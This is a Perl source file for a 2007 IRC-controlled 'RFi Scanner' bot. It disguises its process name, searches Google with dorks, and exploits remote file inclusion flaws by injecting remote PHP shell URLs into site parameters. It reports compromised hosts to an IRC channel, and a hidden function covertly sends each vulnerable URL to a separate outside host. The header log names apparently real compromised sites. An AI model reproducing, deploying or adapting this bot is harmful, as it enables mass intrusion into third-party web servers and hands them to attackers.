#################################################################################################################################################
# 
# RFi Scanner 2007 by Morgan.. 
#
# <@Morgan> !scan page.php?id= "Powered by RGameScript"
# <NewScan_Google> [Scan] Started: page.php?id= - Dork: "Powered by RGameScript" Engine: Google 
# <NewScan_Google> [Scan] Google Found: 1656 Sites!
# <NewScan_Google> [Scan] Cleaned results: 36 Sites!
# <NewScan_Google> [Scan] Exploting started! 
# <NewScan_Google> [SafeON] [Sys Linux] [Free 36.55 GB ] http://gry.nakazdytemat.pl/page.php?id=http://usuarios.arnet.com.ar/larry123/cmd.jpg? 
# <NewScan_Google> [Information] Linux blackhawk.avx.pl 2.6.19.2 #4 SMP Fri Feb 2 11:51:02 CET 2007 i686 
# <NewScan_Google> [SafeOFF] [Sys Linux] [Free 26.26 GB ] http://allgamesallfree.org/page.php?id=http://usuarios.arnet.com.ar/larry123/cmd.jpg? 
# <NewScan_Google> [Information] Linux games.allgamesallfree.com 2.6.9-55.0.2.ELsmp #1 SMP Tue Jun 26 14:30:58 EDT 2007 i686 
# <NewScan_Google> [Scan] Scan Finished "Powered by RGameScript"
#
#
# Enjoy!
# /Morgan
#
# irc.realworm.net - #Morgan
#################################################################################################################################################

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

###############CONFIGURATION###################
my $processo = "/usr/local/apache/bin/nscan -DSSL";
my $printcmd="http://www.animedinasty.org/cmd/info.jpg?"; #<---- Change this for your CMD 
my $server="irc.x-reaction.net";
my $porta="6667";
my $nick="x____H264____x";
my $chan="#a";
###############END OF CONFIGURATION############

my $verbot = "2.0";
my $cmd="http://www.greenkorea.ph/bbs/data/_metal/safe.txt?"; #Never change this
my $pid=fork;
exit if $pid;
$0="$processo"."\0"x16;
my $sk = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$porta",Proto=>"tcp") or die "Can not connect on server!\n";
$sk->autoflush(1);
print $sk "NICK $nick\r\n";
print $sk "USER Google 8 *  : Google : google@google.it : Google :Google\r\n";
print $sk "JOIN $chan\r\n";
print $sk "PRIVMSG $chan :3,1[9S3,1can-Bot] Scan is 3ON1 : 9!scan <bug> <dork>\r\n";

while($line = <$sk>){

$line =~ s/\r\n$//;
if ($line=~ /^PING \:(.*)/)
{
print "PONG :$1";
print $sk "PONG :$1";
}

if ($line=~ /PRIVMSG $chan :.deletebot/){
stampa($sk, "QUIT");
}

if ($line=~ /PRIVMSG $chan :!scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
stampa($sk, "PRIVMSG $chan :3,1[9S3,1can] Started:9 $bug 3 Dork:9 $dork 3Engine:9 Google ");
my @glist=&google($dork);
stampa($sk, "PRIVMSG $chan :3,1[9S3,1can] Google Found:9 ".scalar(@glist)."3 Sites!");
push(my @tot, @glist);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $chan :3,1[9S3,1can] Cleaned results: 9 ".scalar(@puliti)."3 Sites!");
stampa($sk, "PRIVMSG $chan :3,1[9S3,1can] Exploting started! ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %30==0){
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $chan :3,1[9S3,1can] Scan Finished9 $dork");
}
my $test="http://".$sito.$bug.$cmd."?";
my $print="http://".$sito.$bug.$printcmd."?";
my $vuln="http://".$sito.$bug."";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /31337/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space,$ker)=split(/\,/,$x);
stampa($sk, "PRIVMSG $chan :3,1[9S3afe9OFF3] 3,1[9S3ys9 ".$type."3] 3,1[9F3ree9 ".$space." 9] $print ");
stampa($sk, "PRIVMSG $chan :3,1[9I3nformation3]9 $ker  ");
checksafemode("$print");}}
elsif($re =~ /31337/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space,$ker)=split(/\,/,$x);
stampa($sk, "PRIVMSG $chan :3,1[9S3afe14ON3] 3,1[9S3ys14 ".$type."3] 3,1[9F3ree14 ".$space." 3]14 $print ");
stampa($sk, "PRIVMSG $chan :3,1[9I3nformation3]14 $ker  ");
checksafemode("$print");}}
}}}
exit;
}}}


sub stampa()
{
if ($#_ == '1') {
my $sk = $_[0];
print $sk "$_[1]\n";
} else {
print $sk "$_[0]\n";
}}

sub os(){
my $sito=$_[0];
my $Res=query($sito);
my $type;
my $space;
my $ker;
my $str;
while($Res=~m/<br>OSTYPE:(.+?)\<br>/g){
$type=$1;
}
while($Res=~m/<br>Kernel:(.+?)\<br>/g){
$ker=$1;
}
while($Res=~m/<br>Free:(.+?)\<br>/g){
$space=$1;
}
$str=$type.",".$space.",".$ker;
return $str;
}
sub google(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.it/search?hl=it&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}


sub checksafemode($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"tckct.co.uk",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET /logfiles/CDPW3U1032/safe.php?url=$query HTTP/1.0\r\nHost: tckct.co.uk\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
}


sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}
return @unici;
}

